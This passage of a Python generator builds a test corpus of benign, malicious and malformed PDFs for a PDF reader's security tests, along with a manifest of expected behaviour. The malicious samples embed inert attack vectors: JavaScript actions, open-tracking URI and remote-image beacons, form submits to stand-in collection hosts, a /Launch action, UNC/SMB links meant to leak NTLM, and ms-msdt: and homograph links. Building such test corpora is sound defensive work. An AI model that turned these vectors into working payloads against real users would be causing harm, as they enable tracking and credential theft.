    return signed_sample("signed", SIGNED_TEXT, certify=False)


def benign_signed_docmdp() -> bytes:
    return signed_sample("signed-docmdp-p1", CERTIFIED_TEXT, certify=True)


# --------------------------------------------------------------------------- malicious


JS = pdf_string("app.alert('This script must never run.');")


def malicious_js_document() -> bytes:
    doc = single_page_doc("js-document-level", [(72, 720, 14, "Document-level JavaScript (name tree)")])
    action = doc.pdf.add(f"<< /S /JavaScript /JS {JS} >>")
    doc.catalog_extra = f" /Names << /JavaScript << /Names [(init) {action} 0 R] >> >>"
    return doc.build()


def malicious_openaction_js() -> bytes:
    doc = single_page_doc("openaction-js", [(72, 720, 14, "/OpenAction JavaScript")])
    doc.catalog_extra = f" /OpenAction << /S /JavaScript /JS {JS} >>"
    return doc.build()


def malicious_openaction_uri() -> bytes:
    doc = single_page_doc("openaction-uri", [(72, 720, 14, "/OpenAction URI (tracking beacon)")])
    doc.catalog_extra = f" /OpenAction << {uri_action(b'https://beacon.example.invalid/opened')} >>"
    return doc.build()


def malicious_page_aa() -> bytes:
    doc = single_page_doc(
        "page-aa", [(72, 720, 14, "Page /AA open and close actions")],
        extra=f" /AA << /O << /S /JavaScript /JS {JS} >> /C << /S /JavaScript /JS {JS} >> >>",
    )
    return doc.build()


def form_doc(name: str, label: str, field_body: str) -> bytes:
    doc = Document(name)
    doc.reserve_pages(1)
    widget = doc.pdf.add(
        f"<< /Type /Annot /Subtype /Widget /Rect [72 650 300 680] /F 4"
        f" /P {doc.page_nums[0]} 0 R /MK << /BG [0.9 0.9 0.9] >> {field_body} >>"
    )
    doc.set_page(0, Page(lines=[(72, 720, 14, label)], annots=[widget]))
    doc.catalog_extra = f" /AcroForm << /Fields [{widget} 0 R] /NeedAppearances true >>"
    return doc.build()


def malicious_field_aa() -> bytes:
    return form_doc(
        "field-aa", "Text field with /AA keystroke and format scripts",
        f"/FT /Tx /T (amount) /AA << /K << /S /JavaScript /JS {JS} >> /F << /S /JavaScript /JS {JS} >> >>",
    )


def malicious_submitform() -> bytes:
    return form_doc(
        "submitform", "Button that submits the form to a remote URL",
        "/FT /Btn /Ff 65536 /T (send) /A << /S /SubmitForm"
        " /F << /FS /URL /F (https://collect.example.invalid/submit) >> /Flags 4 >>",
    )


def malicious_importdata() -> bytes:
    return form_doc(
        "importdata", "Button that imports form data from a file",
        "/FT /Btn /Ff 65536 /T (load) /A << /S /ImportData /F (does-not-exist.example.fdf) >>",
    )


def malicious_launch() -> bytes:
    return link_sample(
        "launch", "Launch action (program does not exist)",
        "/S /Launch /F (does-not-exist.example.exe)"
        " /Win << /F (does-not-exist.example.exe) /P (--never-run) >> /NewWindow true",
    )


def malicious_gotor_unc() -> bytes:
    return link_sample(
        "gotor-unc", "GoToR to a UNC path (SMB/NTLM leak on Windows)",
        r"/S /GoToR /F (\\\\share.example.invalid\\x\\doc.pdf) /D [0 /Fit]",
    )


def malicious_gotoe() -> bytes:
    return link_sample(
        "gotoe", "GoToE into an embedded document",
        "/S /GoToE /T << /R /C /N (attached.pdf) >> /D [0 /Fit]",
    )


def malicious_remote_filespec() -> bytes:
    doc = Document("remote-filespec")
    image = doc.pdf.add(Pdf.stream(
        "/Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray"
        " /BitsPerComponent 8 /F << /FS /URL /F (https://img.example.invalid/beacon.png) >>",
        b"",
    ))
    doc.add_pages([Page(
        lines=[(72, 720, 14, "Image XObject whose data is an external URL stream")],
        extra_content=b"q 100 0 0 100 72 500 cm /Im1 Do Q\n",
        resources=f"/XObject << /Im1 {image} 0 R >> ",
    )])
    return doc.build()


def malicious_xfa() -> bytes:
    xdp = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        b'  <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">\n'
        b'    <subform name="form1"><event activity="initialize">'
        b'<submit target="https://collect.example.invalid/xfa"/></event></subform>\n'
        b"  </template>\n</xdp:xdp>\n"
    )
    doc = Document("xfa")
    doc.reserve_pages(1)
    xfa = doc.pdf.add_stream("", xdp)
    doc.set_page(0, Page(lines=[(72, 720, 14, "XFA form with a remote submit")]))
    doc.catalog_extra = f" /AcroForm << /Fields [] /XFA {xfa} 0 R >>"
    return doc.build()


def malicious_embedded_file() -> bytes:
    doc = single_page_doc("embedded-file", [(72, 720, 14, "Document with an embedded file")])
    data = doc.pdf.add_stream("/Type /EmbeddedFile /Subtype /text#2Fplain", b"hello from an attachment\n")
    spec = doc.pdf.add(f"<< /Type /Filespec /F (note.txt) /UF (note.txt) /EF << /F {data} 0 R >> >>")
    doc.catalog_extra = f" /Names << /EmbeddedFiles << /Names [(note.txt) {spec} 0 R] >> >>"
    return doc.build()


def link_scheme_sample(name: str, uri: bytes, label: str) -> bytes:
    return link_sample(name, label, uri_action(uri))


LONG_URL = b"https://example.invalid/" + b"a" * (10_000 - len(b"https://example.invalid/"))


# --------------------------------------------------------------------------- malformed


def malformed_truncated() -> bytes:
    data = benign_multi_page()
    return data[: len(data) * 6 // 10]


def malformed_broken_xref() -> bytes:
    doc = Document("broken-xref")
    doc.add_pages([Page(lines=[(72, 720, 24, "Every xref offset is wrong")])])
    return doc.build(xref_shift=7)


def malformed_page_tree_cycle() -> bytes:
    pdf = Pdf()
    catalog, pages = pdf.reserve(), pdf.reserve()
    pdf.set(pages, f"<< /Type /Pages /Kids [{pages} 0 R] /Count 1 >>")
    pdf.set(catalog, f"<< /Type /Catalog /Pages {pages} 0 R >>")
    return pdf.build(catalog, doc_id=doc_id("page-tree-cycle"))


def malformed_outline_cycle() -> bytes:
    doc = Document("outline-cycle")
    doc.add_pages([Page(lines=[(72, 720, 24, "Outline items point at each other")])])
    root, a, b = doc.pdf.reserve(), doc.pdf.reserve(), doc.pdf.reserve()
    dest = f"/Dest [{doc.page_nums[0]} 0 R /Fit]"
    doc.pdf.set(a, f"<< /Title (A) /Parent {root} 0 R /Next {b} 0 R {dest} >>")
    doc.pdf.set(b, f"<< /Title (B) /Parent {root} 0 R /Next {a} 0 R /Prev {a} 0 R {dest} >>")
    doc.pdf.set(root, f"<< /Type /Outlines /First {a} 0 R /Last {b} 0 R /Count 2 >>")
    doc.catalog_extra = f" /Outlines {root} 0 R"
    return doc.build()


def malformed_huge_page() -> bytes:
    doc = Document("huge-page-size")
    doc.add_pages([Page(size=(1_000_000_000, 1_000_000_000), lines=[(72, 720, 24, "MediaBox 1e9 x 1e9")])])
    return doc.build()


def malformed_deep_nesting() -> bytes:
    depth = 10_000
    doc = Document("deep-nesting")
    doc.add_pages([Page(lines=[(72, 720, 24, "10,000 nested arrays")], extra=" /Junk " + "[" * depth + "]" * depth)])
    return doc.build()


def malformed_no_pages() -> bytes:
    doc = Document("no-pages")
    return doc.build()


# --------------------------------------------------------------------------- on demand


def large_1000_pages(path: Path) -> None:
    """~200 MB: 1000 pages, each with a 256 x 256 RGB image (uncompressed) and searchable text."""
    rng = random.Random(1000)
    doc = Document("large-1000-pages")
    doc.reserve_pages(1000)
    for i in range(1000):
        image = doc.pdf.add_stream(
            "/Type /XObject /Subtype /Image /Width 256 /Height 256 /ColorSpace /DeviceRGB /BitsPerComponent 8",
            rng.randbytes(256 * 256 * 3),
        )
        doc.set_page(i, Page(
            lines=[(72, 740, 20, f"Page {i + 1} of 1000"),
                   (72, 716, 12, f"Search target: needle-{i + 1:04d} and the common word privacy.")],
            extra_content=b"q 468 0 0 468 72 180 cm /Im1 Do Q\n",
            resources=f"/XObject << /Im1 {image} 0 R >> ",
        ))
    path.write_bytes(doc.build())


def outline_100k(path: Path) -> None:
    """100,000 top-level outline items (exceeds the 10,000 item limit; must be truncated)."""
    entries = [(f"Item {n}", 0, 0) for n in range(100_000)]
    doc = Document("outline-100k-items")
    doc.reserve_pages(1)
    doc.set_page(0, Page(lines=[(72, 720, 24, "100,000 outline items")]))
    doc.catalog_extra = f" /Outlines {add_outline(doc, entries)} 0 R"
    path.write_bytes(doc.build())


# --------------------------------------------------------------------------- corpus


@dataclass
class Sample:
    path: str
    build: object
    purpose: str
    expected: str
    pages: int | None = None
    findings: list[str] = field(default_factory=list)
    text: list[str] = field(default_factory=list)


SAMPLES = [
    # benign
    Sample("benign/single-page.pdf", benign_single_page, "Smallest valid document.",
           "Opens; one Letter page.", 1, text=["Hello, PDF Reader."]),
    Sample("benign/multi-page-10.pdf", benign_multi_page, "Ten pages; a unique keyword on page 7.",
           "Opens; 10 pages; searching 'needle' finds exactly one hit on page 7.", 10,
           text=["Page 1 of 10", "needle"]),
    Sample("benign/mixed-text-zh-en.pdf", benign_mixed_text,
           "English and Traditional Chinese text (Type0 font, non-embedded, with ToUnicode).",
           "Opens; both strings are drawn and searchable. The worker substitutes its bundled Droid CJK font for the "
           "non-embedded CNS1 font (DEC-03); without a CJK font MuPDF cannot load the font and the Chinese line is "
           "neither drawn nor searchable.",
           1, text=["Privacy-first PDF Reader", CJK_TEXT]),
    Sample("benign/outline-3-levels.pdf", benign_outline, "Three-level outline over six pages.",
           "Outline shows Chapter 1 > Section 1.1 > Subsection 1.1.1, Chapter 2 > Section 2.1, Appendix; each jumps to its page.",
           6),
    Sample("benign/internal-links.pdf", benign_internal_links, "Internal links (Dest and GoTo action).",
           "Clicking the links on page 1 navigates to pages 3 and 2 without any dialog.", 3),
    Sample("benign/external-https-link.pdf", benign_external_link, "One external https link.",
           "Clicking shows a confirmation dialog with the full URL; cancelling does nothing.", 1),
    Sample("benign/rotated-page.pdf", benign_rotated, "Second page has /Rotate 90.",
           "Page 2 is displayed rotated 90 degrees clockwise.", 2),
    Sample("benign/mixed-page-sizes.pdf", benign_page_sizes, "A4, Letter, A3 landscape and a 200 x 200 pt page.",
           "Each page keeps its own size.", 4),
    Sample("benign/image-only.pdf", benign_image_only, "A page with an image and no text layer.",
           "Renders a gradient; search reports that the document has no text layer.", 1),
    Sample("benign/encrypted-rc4-40.pdf", benign_encrypted,
           "Encrypted with the standard handler (RC4 40-bit, R2); user password 'user', owner password 'owner'.",
           "MVP: reported as encrypted and not supported; no crash.", 1),
    Sample("benign/encrypted-aes256.pdf", benign_encrypted_aes256,
           "AES-256 encryption (standard security handler, revision 6); user password 'user', owner 'owner'.",
           "MVP: reported as encrypted and not supported; no crash. With the password MuPDF decrypts it and "
           "the text is readable.", 1),
    Sample("benign/signed.pdf", benign_signed,
           "Signed (adbe.pkcs7.detached, SHA-256, RSA-2048) with the corpus's self-signed test certificate. The "
           "key is derived from a fixed seed in generate.py, so anyone can re-create it: never trust it.",
           "Opens like an ordinary document; the signature field is readable. The MVP neither verifies nor "
           "shows signatures.", 1, text=[SIGNED_TEXT]),
    Sample("benign/signed-docmdp-p1.pdf", benign_signed_docmdp,
           "Certification signature with DocMDP P=1 (no changes allowed), same test certificate.",
           "Opens; the app must never write to it: a document identifier would break the certification "
           "(ADR 0010).", 1, text=[CERTIFIED_TEXT]),
    # malicious
    Sample("malicious/js-document-level.pdf", malicious_js_document, "Document-level JavaScript in the names tree.",
           "No script runs; finding reported.", 1, ["javaScript"]),
    Sample("malicious/openaction-js.pdf", malicious_openaction_js, "JavaScript in /OpenAction.",
           "No script runs on open; findings reported.", 1, ["javaScript", "openAction"]),
    Sample("malicious/openaction-uri.pdf", malicious_openaction_uri, "URI in /OpenAction (open-tracking beacon).",
           "Nothing is opened or fetched; finding reported.", 1, ["openAction"]),
    Sample("malicious/page-aa.pdf", malicious_page_aa, "Page open/close additional actions with JavaScript.",
           "No script runs when the page is shown or hidden; findings reported.", 1,
           ["javaScript", "additionalActions"]),
    Sample("malicious/field-aa.pdf", malicious_field_aa, "Form field keystroke/format scripts.",
           "No script runs; findings reported.", 1, ["javaScript", "additionalActions"]),
    Sample("malicious/submitform.pdf", malicious_submitform, "Button submitting the form to a remote URL.",
           "Nothing is sent; finding reported.", 1, ["submitForm"]),
    Sample("malicious/importdata.pdf", malicious_importdata, "Button importing form data from a file.",
           "No file is read; finding reported.", 1, ["importData"]),
    Sample("malicious/launch.pdf", malicious_launch, "Link with a /Launch action (nonexistent program).",
           "No program starts; the link is shown as blocked; finding reported.", 1, ["launch"]),
    Sample("malicious/gotor-unc.pdf", malicious_gotor_unc, "GoToR to a UNC path.",
           "No SMB connection is attempted; link blocked; findings reported.", 1,
           ["remoteGoTo", "uncReference"]),
    Sample("malicious/gotoe.pdf", malicious_gotoe, "GoToE into an embedded document.",
           "Link blocked; finding reported.", 1, ["embeddedGoTo"]),
    Sample("malicious/remote-filespec.pdf", malicious_remote_filespec,
           "Image XObject whose data is an external stream at a URL (remote resource beacon).",
           "Nothing is fetched; the image is not drawn; finding reported.", 1, ["remoteFileSpec"]),
    Sample("malicious/xfa.pdf", malicious_xfa, "XFA form with a remote submit event.",
           "XFA is ignored; finding reported.", 1, ["xfa"]),
    Sample("malicious/embedded-file.pdf", malicious_embedded_file, "Document with an embedded file.",
           "The attachment is never opened or extracted automatically; finding reported.", 1, ["embeddedFile"]),
    Sample("malicious/link-javascript-scheme.pdf",
           lambda: link_scheme_sample("link-javascript-scheme", b"javascript:app.alert(1)", "javascript: URI"),
           "URI link with the javascript: scheme.", "Blocked with an explanation; nothing runs.", 1),
    Sample("malicious/link-file-scheme.pdf",
           lambda: link_scheme_sample("link-file-scheme", b"file:///C:/Windows/System32/calc.exe", "file: URI"),
           "URI link with the file: scheme.", "Blocked with an explanation; nothing opens.", 1),
    Sample("malicious/link-smb-scheme.pdf",
           lambda: link_scheme_sample("link-smb-scheme", b"smb://share.example.invalid/x", "smb: URI"),
           "URI link with the smb: scheme.", "Blocked with an explanation; no SMB connection.", 1),
    Sample("malicious/link-unc-uri.pdf",
           lambda: link_scheme_sample("link-unc-uri", b"\\\\share.example.invalid\\x", "UNC path as URI"),
           "URI link whose value is a UNC path.", "Blocked with an explanation; no SMB connection.", 1),
    Sample("malicious/link-ms-protocol.pdf",
           lambda: link_scheme_sample("link-ms-protocol", b"ms-msdt:/id PCWDiagnostic", "ms-msdt: URI"),
           "URI link with a Windows protocol handler scheme.", "Blocked with an explanation; nothing starts.", 1),
    Sample("malicious/link-idn-homograph.pdf",
           lambda: link_scheme_sample("link-idn-homograph", "https://\u0430pple.example.invalid/".encode("utf-8"),
                                      "IDN homograph (Cyrillic a)"),
           "https link whose host uses a Cyrillic 'а' (UTF-8 bytes).",
           "Confirmation dialog shows the punycode host and an IDN warning.", 1),
    Sample("malicious/link-rtl-override.pdf",
           lambda: link_scheme_sample("link-rtl-override", "https://example.invalid/\u202Efdp.exe".encode("utf-8"),
                                      "URL containing U+202E"),
           "https link containing a right-to-left override character.",
           "Confirmation dialog shows the control character visibly and warns.", 1),
    Sample("malicious/link-long-url.pdf",
           lambda: link_scheme_sample("link-long-url", LONG_URL, "10,000-character URL"),
           "https link with a 10,000-character URL.", "Confirmation dialog shows the whole URL (scrollable).", 1),
    # malformed
    Sample("malformed/truncated.pdf", malformed_truncated, "multi-page-10.pdf cut at 60%.",
           "Opens with repair or reports corrupted; never crashes."),
    Sample("malformed/broken-xref.pdf", malformed_broken_xref, "Every xref offset is off by 7 bytes.",
           "Opens after repair (1 page) or reports corrupted; never crashes."),
    Sample("malformed/page-tree-cycle.pdf", malformed_page_tree_cycle, "The page tree lists itself as a kid.",
           "Reports corrupted; never hangs or crashes."),
    Sample("malformed/outline-cycle.pdf", malformed_outline_cycle, "Outline items whose /Next pointers form a cycle.",
           "Opens; the outline is cut at the cycle; never hangs.", 1),
    Sample("malformed/huge-page-size.pdf", malformed_huge_page, "MediaBox of 1e9 x 1e9 points.",
           "Rejected by validation or rendered within the raster limits; never allocates unbounded memory."),
    Sample("malformed/deep-nesting.pdf", malformed_deep_nesting, "10,000 nested arrays in the page dictionary.",
           "Opens or reports corrupted; no stack overflow."),
    Sample("malformed/no-pages.pdf", malformed_no_pages, "Structurally valid document with zero pages.",
           "Reports corrupted (a document needs at least one page)."),
    Sample("malformed/not-a-pdf.pdf", lambda: b"This is a plain text file with a .pdf extension.\n",
           "Text file named .pdf.", "Reports not a PDF."),
    Sample("malformed/empty.pdf", lambda: b"", "Zero bytes.", "Reports not a PDF or corrupted."),
]

ON_DEMAND = [
    ("large/output/large-1000-pages.pdf", large_1000_pages,
     "About 200 MB: 1000 pages with a 256 x 256 RGB image and searchable text each (MVP-07, MVP-10).",
     "Opens; memory stays bounded while scrolling; 'needle-0500' finds one hit on page 500.", 1000),
    ("large/output/outline-100k-items.pdf", outline_100k,
     "100,000 outline items (MVP-09).", "Outline truncated at the limit and flagged; no hang.", 1),
]


def check_structure(data: bytes) -> None:
    """Verifies that every in-use xref entry points at its `N 0 obj` header."""
    xref_at = int(data[data.rindex(b"startxref") + 10:].split()[0])
    lines = data[xref_at:].split(b"\n")
    count = int(lines[1].split()[1])
    for num in range(1, count):
        offset = int(lines[2 + num][:10])
        header = f"{num} 0 obj".encode("latin-1")
        if data[offset:offset + len(header)] != header:
            raise AssertionError(f"object {num}: xref offset {offset} does not point at its header")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--large", action="store_true", help="also generate the on-demand files")
    args = parser.parse_args()
    check_aes()

    manifest = {
        "version": 1,
        "generator": "tests/corpus/generate.py",
        "note": "Generated file; run `python tests/corpus/generate.py`. Descriptions in README.md.",
        "files": [],
    }
    for sample in SAMPLES:
        data = sample.build()
        if data != sample.build():
            raise AssertionError(f"{sample.path} is not deterministic")
        if sample.path.startswith("benign/") or sample.path.startswith("malicious/"):
            check_structure(data)
        target = ROOT / sample.path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)
        manifest["files"].append({
            "path": sample.path,
            "category": sample.path.split("/")[0],
            "purpose": sample.purpose,
            "expected": sample.expected,
            "pages": sample.pages,
            "findings": sample.findings,
            "text": sample.text,
            "bytes": len(data),
            "sha256": hashlib.sha256(data).hexdigest(),
        })
    for path, _, purpose, expected, pages in ON_DEMAND:
        manifest["files"].append({
            "path": path,
            "category": "large",
            "purpose": purpose,
            "expected": expected,
            "pages": pages,
            "findings": [],
            "text": [],
            "onDemand": True,
        })

    with open(ROOT / "manifest.json", "w", encoding="utf-8", newline="\n") as handle:
        json.dump(manifest, handle, ensure_ascii=False, indent=2)
        handle.write("\n")

    if args.large:
        LARGE_OUTPUT.mkdir(parents=True, exist_ok=True)
        for path, build, *_ in ON_DEMAND:
            print(f"generating {path} ...", file=sys.stderr)
            build(ROOT / path)

    print(f"wrote {len(SAMPLES)} samples and manifest.json", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
